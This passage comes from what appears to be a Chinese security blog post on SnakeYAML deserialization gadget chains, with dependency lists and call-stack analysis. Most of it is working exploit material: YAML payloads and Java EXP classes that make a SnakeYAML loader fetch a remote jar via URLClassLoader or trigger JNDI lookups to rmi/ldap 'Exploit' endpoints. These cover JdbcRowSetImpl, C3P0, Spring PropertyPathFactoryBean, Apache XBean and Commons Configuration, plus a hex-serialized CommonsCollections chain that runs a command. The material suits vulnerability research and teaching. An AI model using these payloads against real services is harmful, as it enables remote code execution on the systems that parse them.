(javax.script)</span><br><span class="line">init:<span class="number">84</span>, ScriptEngineManager (javax.script)</span><br><span class="line">&lt;init&gt;:<span class="number">75</span>, ScriptEngineManager (javax.script)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">construct:<span class="number">570</span>, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">331</span>, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:<span class="number">229</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:<span class="number">219</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:<span class="number">173</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:<span class="number">157</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:<span class="number">490</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:<span class="number">416</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:<span class="number">9</span>, SPInScriptEngineManager</span><br></pre></td></tr></table></figure>

<h4 id="payloda"><a href="#payloda" class="headerlink" title="payloda"></a>payloda</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&quot;http://localhost:9999/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure>

<p>就是构建了java.net.URL对象，构造函数参数为”<a target="_blank" rel="noopener" href="http://localhost:9999/yaml-payload.jar%22%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E8%BF%99%E4%B8%AA%E5%AF%B9%E8%B1%A1%E4%BD%9C%E4%B8%BAjava.net.URLClassLoader%E7%9A%84%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%EF%BC%8C%E6%9D%A5%E6%9E%84%E9%80%A0URLClassLoader%E5%AF%B9%E8%B1%A1%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8%E8%BF%99%E4%B8%AAURLClassLoader%E5%AF%B9%E8%B1%A1%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%8E%BB%E5%81%9Ajavax.script.ScriptEngineManager%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E6%9D%A5%E6%9E%84%E9%80%A0ScriptEngineManager%E5%AF%B9%E8%B1%A1%E3%80%82">http://localhost:9999/yaml-payload.jar&quot;，然后将这个对象作为java.net.URLClassLoader的构造函数的参数，来构造URLClassLoader对象，然后用这个URLClassLoader对象作为参数，去做javax.script.ScriptEngineManager构造函数的参数来构造ScriptEngineManager对象。</a></p>
<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \&quot;ldap://localhost:1389/Exploit\&quot;\n autoCommit: true&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;rmi://127.0.0.1:1099/Exploit\&quot;, autoCommit: true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  jndiName: \&quot;rmi://localhost/Exploit\&quot;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  loginTimeout: 0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource  &#123;jndiName: \&quot;rmi://localhost/Exploit\&quot;,  loginTimeout: \&quot;0\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="C3P0-WrapperConnectionPoolDataSource"><a href="#C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="C3P0 WrapperConnectionPoolDataSource"></a>C3P0 WrapperConnectionPoolDataSource</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  userOverridesAsString: \&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C77080000001000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B78707400036B65797372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000047372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65707400096765744D6574686F64757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001C7371007E00137571007E0018000000027070740006696E766F6B657571007E001C00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E00137571007E00180000000174000463616C63740004657865637571007E001C0000000171007E001F7371007E00003F4000000000000C77080000001000000000787874000576616C756578</span></span><br><span class="line"><span class="string">;\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.18<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.18<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>可以SimpleJndiBeanFactory#getBean函数可以jndi注入。</p>
<p><img src="https://cmisl.github.io/images/image-20240714221239211.png" alt="image-20240714221239211"></p>
<p><img src="https://cmisl.github.io/images/image-20240714221523179.png" alt="image-20240714221523179"></p>
<p>我们需要找到一个类，他的setter会调用getBean函数。这里我们找到的是PropertyPathFactoryBean#setBeanFactory方法。BeanFactory是一个private属性，可以调用，所以构造一个PropertyPathFactoryBean对象</p>
<p><img src="https://cmisl.github.io/images/image-20240714221850975.png" alt="image-20240714221850975"></p>
<p>有一些不太难得小绕过，比如propertyPath不能为空，否则抛异常，还有beanFactory.isSingleton(this.targetBeanName)会检测构造的SimpleJndiBeanFactory中的shareableResources这个集合，是否包含了this.targetBeanName，只有包含了才能通过判断，然后执行getBean函数。</p>
<p><img src="https://cmisl.github.io/images/image-20240714223951797.png" alt="image-20240714223951797"></p>
<p>根据上面的小demo，可以轻易写出exp了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringPropertyPathFactoryBeanEXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; targetBeanName: \&quot;rmi://localhost:1099/evilexp\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; propertyPath: cmisl\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  shareableResources: [\&quot;rmi://localhost:1099/evilexp\&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!org.springframework.beans.factory.config.PropertyPathFactoryBean</span></span><br><span class="line"> <span class="attr">targetBeanName:</span> <span class="string">&quot;rmi://localhost:1099/evilexp&quot;</span></span><br><span class="line"> <span class="attr">propertyPath:</span> <span class="string">cmisl</span></span><br><span class="line"> <span class="attr">beanFactory:</span> <span class="type">!!org.springframework.jndi.support.SimpleJndiBeanFactory</span></span><br><span class="line">  <span class="attr">shareableResources:</span> [<span class="string">&quot;rmi://localhost:1099/evilexp&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>这里没有构造出一行版本的payload，因为要求在解析完targetBeanName后识别一个块映射的结束（<code>&lt;block end&gt;</code>），但实际找到的是一个标量（<code>&lt;scalar&gt;</code>）。一行会导致块映射的结束（<code>&lt;block end&gt;</code>）的丢失。</p>
<h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><h4 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>比较眼熟的一个函数，在jndi高版本绕过不出网利用中出现过。这个方法在ContextUtil$ReadOnlyBinding#resolve中，而resolve又被ContextUtil$ReadOnlyBinding#getObject调用。</p>
<p><img src="https://cmisl.github.io/images/image-20240715015542586.png" alt="image-20240715015542586"></p>
<p>然后就要找调用了getObject的地方，这里我们找到的是Binding的toString方法，因为Binding这个类是ReadOnlyBinding的父类。当我们构造好ReadOnlyBinding，调用ReadOnlyBinding的toString，因为自己没有这个方法所以会直接调用父类Binding的toString方法，然后调用到自己的getObject。</p>
<p><img src="https://cmisl.github.io/images/image-20240715023036483.png" alt="image-20240715023036483"></p>
<p>接着我们需要寻找调用了toString方法的地方，最好是在构造函数中。因为我们反序列化的过程中，会调用对我们要反序列化的类进行初始化，这里找到的是BadAttributeValueExpException（不知道咋从1w多个方法里找的，汗），完美，参数是Object类型，方便调用到我们指定类的toString方法。</p>
<p><img src="https://cmisl.github.io/images/image-20240715024001343.png" alt="image-20240715024001343"></p>
<p>所以可以写出EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApacheXBeanEXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[&#x27;cmisl&#x27;,!!javax.naming.Reference [&#x27;evilexp&#x27;, &#x27;evilexp&#x27;, &#x27;http://127.0.0.1:9999/&#x27;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;!!org.apache.xbean.naming.context.WritableContext []]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实我们在javax.management.BadAttributeValueExpException并没有val的setter&#x2F;getter函数，为什么能反序列化成功呢，其实yaml数据不同格式会用不同方法反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String yaml_payload=<span class="string">&quot;!!demo.Demo &#123;age: 5&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">无参</span><br><span class="line">setAge</span><br><span class="line">Demo&#123;object=<span class="literal">null</span>, age=<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------</span><br><span class="line"></span><br><span class="line">String yaml_payload=<span class="string">&quot;!!demo.Demo [null,5]&quot;</span>;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">Demo&#123;object=<span class="literal">null</span>, age=<span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure>

<p>不难察觉两者的差别，第一中是用setter函数设置属性的值，第二种这是直接构造函数中赋值，不需要setter方法。</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload=<span class="string">&quot;!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [&#x27;cmisl&#x27;,!!javax.naming.Reference [&#x27;evilexp&#x27;, &#x27;evilexp&#x27;, &#x27;http://127.0.0.1:9999/&#x27;],!!org.apache.xbean.naming.context.WritableContext []]]&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><h4 id="依赖-2"><a href="#依赖-2" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApacheCommonsConfigurationEXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yaml_payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[!!org.apache.commons.configuration.JNDIConfiguration &quot;</span> +</span><br><span class="line">                <span class="string">&quot;[!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/evilexp\&quot;]]: 1&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(yaml_payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以根据下面调用堆栈分析一下，这个能走通挺厉害的。大概就是，如果你的yaml数据是键值对，反序列化的过程中就会调用key的hashcode函数，这条链就是ConfigurationMap的hashcode，继承自父类，然后hashcode调用了iterator方法。然后调用configuration属性的getkeys方法，我们将这个属性设置为JNDIConfiguration对象，那么就会调用JNDIConfiguration#getkeys，再通过这个方法里面的getBaseContext方法走到jndi</p>
<p>调用堆栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">lookup:-<span class="number">1</span>, RegistryImpl_Stub (sun.rmi.registry)</span><br><span class="line">lookup:<span class="number">118</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">getBaseContext:<span class="number">452</span>, JNDIConfiguration (org.apache.commons.configuration)</span><br><span class="line">getKeys:<span class="number">203</span>, JNDIConfiguration (org.apache.commons.configuration)</span><br><span class="line">getKeys:<span class="number">182</span>, JNDIConfiguration (org.apache.commons.configuration)</span><br><span class="line">&lt;init&gt;:<span class="number">161</span>, ConfigurationMap$ConfigurationSet$ConfigurationSetIterator (org.apache.commons.configuration)</span><br><span class="line">&lt;init&gt;:<span class="number">154</span>, ConfigurationMap$ConfigurationSet$ConfigurationSetIterator (org.apache.commons.configuration)</span><br><span class="line">iterator:<span class="number">207</span>, ConfigurationMap$ConfigurationSet (org.apache.commons.configuration)</span><br><span class="line">hashCode:<span class="number">505</span>, AbstractMap (java.util)</span><br><span class="line">processDuplicateKeys:<span class="number">94</span>, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">flattenMapping:<span class="number">76</span>, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:<span class="number">189</span>, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:<span class="number">460</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">556</span>, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:<span class="number">229</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:<span class="number">219</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:<span class="number">173</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:<span class="number">157</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:<span class="number">490</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:<span class="number">416</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:<span class="number">9</span>, ApacheCommonsConfigurationEXP</span><br></pre></td></tr></table></figure>



<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">yaml_payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/evilexp\&quot;]]: 1&quot;</span></span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SnakeYaml-%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">SnakeYaml 链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Yaml-%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.</span> <span class="toc-text">Yaml 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">基本结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%A9%E8%BF%9B%E5%92%8C%E5%9D%97%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.2.</span> <span class="toc-text">缩进和块结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E5%92%8C%E5%88%AB%E5%90%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">引用和别名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E6%96%87%E6%A1%A3%E6%94%AF%E6%8C%81"><span class="toc-number">1.2.4.</span> <span class="toc-text">多文档支持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%92%8C%E8%BD%AC%E4%B9%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">特殊字符和转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">1.2.6.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E6%9D%82%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.7.</span> <span class="toc-text">复杂结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.8.</span> <span class="toc-text">内置类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.9.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#snakeYaml%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">snakeYaml序列化&#x2F;反序列化分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo%E6%BC%94%E7%A4%BA"><span class="toc-number">1.3.2.</span> <span class="toc-text">demo演示</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-Java-%E7%B1%BB"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">定义 Java 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 